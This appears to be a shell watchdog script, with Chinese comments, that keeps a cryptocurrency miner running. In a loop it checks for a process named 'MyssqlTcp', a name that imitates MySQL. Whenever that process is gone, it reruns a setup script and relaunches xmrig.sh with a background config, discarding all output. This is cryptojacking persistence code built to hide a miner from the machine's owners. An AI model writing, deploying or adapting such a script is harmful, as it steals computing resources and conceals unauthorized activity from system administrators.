#!/bin/sh
#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

#添加本地执行路径
export LD_LIBRARY_PATH=$HOME/myssqltcp/

while true; do
        #启动一个循环，定时检查进程是否存在
        server=`ps aux | grep MyssqlTcp | grep -v grep`
        if [ ! "$server" ]; then
            #如果不存在就重新启动
            ./addconf.sh
            /bin/bash ./xmrig.sh --config=./config_background.json >/dev/null 2>&1
            #启动后沉睡10s
            sleep 10
        fi
        #每次循环沉睡10s
        sleep 5
done
